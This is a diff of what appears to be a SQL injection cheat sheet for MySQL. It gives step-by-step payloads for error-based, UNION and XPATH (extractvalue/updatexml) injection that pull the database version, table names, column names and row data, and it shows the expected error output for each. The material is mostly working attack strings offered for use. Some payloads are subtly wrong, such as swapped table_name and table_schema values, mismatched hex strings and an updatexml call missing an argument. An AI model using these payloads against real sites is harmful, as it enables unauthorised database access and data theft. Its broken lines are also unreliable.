@@ -2,24 +2,150 @@
 
 METHOD 1:
 
-**Retrieve database version:**
+------------------------------------------------------------------------------------------------
+Retrieve database version:
 +OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-
 
 Output with database version:
 Duplicate entry '5.7.29-log:1' for key ''
 
-**Retrieve database name:**
+-------------------------------------------------------------------------------------------------
+Retrieve database name:
 +AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
 
 Output with database name:
-Duplicate entry 'ExampleName' for key ''
+Duplicate entry 'BD' for key ''
 
-**Retrieve tables:**
+-------------------------------------------------------------------------------------------------
+Retrieve tables:
 https://magictool.ai/tool/text-to-hex-converter/
-First we convert the database name to 0xHEX: ExampleName -> **0x4578616d706c654e616d65**
+First we convert the database name to 0xHEX: BD -> 0x4244
 
-Given query will output the first table of the database:
-+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=**0x6c69746f666c6578**+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+Retrieve the first table of the database:
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x4244+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+
+Error output shows the first table name:
+Duplicate entry 'TABLE1' for key ''
+
+Retrieve the second table of the database:
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x4244+LIMIT+1,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+
+Error output shows the second table name:
+Duplicate entry 'TABLE2' for key ''
+
+Do the same with but change the number in the payload to retrieve different tables: (+LIMIT+0,1)
+Change it to: (+LIMIT+1,1) then (+LIMIT+2,1)... to retrieve different table columns.
+
+-------------------------------------------------------------------------------------------------
+Retrieve columns:
+
+Converting from string to 0xHEX:
+
+BD -> 0x4244
+TABLE1 -> 0x5441424c4531
+The given query will dump the first column inside TABLE1 table.
+
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x4244+AND+table_schema=0x5441424c4531+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+
+To dump the second column of TABLE1 table, replace (+LIMIT+0,1) with (+LIMIT+1,1)
+To dump the third column of TABLE1 table, replace (+LIMIT+1,1) with (+LIMIT+2,1) and so on...
+
+Example column retrieved: Data1
+
+-------------------------------------------------------------------------------------------------
+Retrieve data from column:
+
+Converting from string to 0xHEX:
+
+BD -> 0x4244
+TABLE1 -> 0x5441424c4531
+Data1 -> 0x4461746131
+
+The final payload would be:
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(Data1)+AS+CHAR),0x7e))+FROM+BD.TABLE1+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+
+The error will output the data
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+METHOD 2:
+
+The used SELECT statements have a different number of columns (Second method + WAF Bypass)
+
+How many columns the database has:
+' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -
+
+Error output:
+Unknown column '15' in 'group statement'
+(Means it has 14 columns)
+
+Retrieving the version of database:
+' Union Select 1,2,3,4,5,version(),7,8,9,10,11,12,13,14-- -
+
+Retrieving the database name:
+' Union Select 1,2,3,4,5,database(),7,8,9,10,11,12,13,14-- -
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+METHOD 3:
+
+The used SELECT statements have a different number of columns (Third method)
+The third method consists on XPATH queries.
+
+Retrieving the database version:
+and extractvalue(0x0a,concat(0x0a,(select version())))-- -
+and updatexml(null,concat(0x0a,(select version())),null)-- -
+
+Output error:
+XPATH SYNTAX ERROR: '5.0.35'35
+
+-------------------------------------------------------------------------------------------------
+
+Retrieving the database name:
+and extractvalue(0x0a,concat(0x0a,(select database())))-- -
+and updatexml(null,concat(0x0a,(select database())),null)-- -
+
+Output error:
+XPATH SYNTAX ERROR: 'AUX_DB'35
+
+-------------------------------------------------------------------------------------------------
+
+Retrieving table1
+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
+and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)-- -
+
+Output error:
+XPATH SYNTAX ERROR: 'AUX_column1'35
+
+(NOTE: Replace the number with bigger number to retrieve the other table [limit 0,1]. For example, number 0 will retrieve the 1st table, number 1 will do the 2nd column, number 2 will do the 3nd column and so on:
+
+Retrieving table2
+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)))-- -
+and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)),null)-- -
+
+Output error:
+XPATH SYNTAX ERROR: 'AUX_column2'35
 
 
+-------------------------------------------------------------------------------------------------
 
+Retrieving columns:
+https://magictool.ai/tool/text-to-hex-converter/
+First, convert database and table's name into 0xHEX value:
+
+database: AUX_DB -> 0x4155585f4442
+table: AUX_COLUMN1 -> 0x4155585f434f4c554d4e31
+
+and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f4442 and table_name=0x4155585f636f6c756d6e31 limit 0,1)))-- -
+and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f4442 and table_name=0x4155585f636f6c756d6e31 limit 0,1)),null)-- -
+
+Output error:
+XPATH SYNTAX ERROR: 'AUX_DATA'35
+
+-------------------------------------------------------------------------------------------------
+
+Retrieving data:
+and extractvalue(0x0a,concat(0x0a,(select concat(AUX_DATA) from AUX_DB.AUX_COLUMN1 limit 0,1)))
+and updatexml(0x0a,concat(0x0a,(select concat(AUX_DATA) from AUX_DB.AUX_COLUMN1 limit 0,1)))
+
+(NOTE: Replace the number with bigger number to retrieve the other table [limit 0,1]. For example, number 0 will retrieve the 1st data, number 1 will do the 2nd data, number 2 will do the 3nd data and so on:
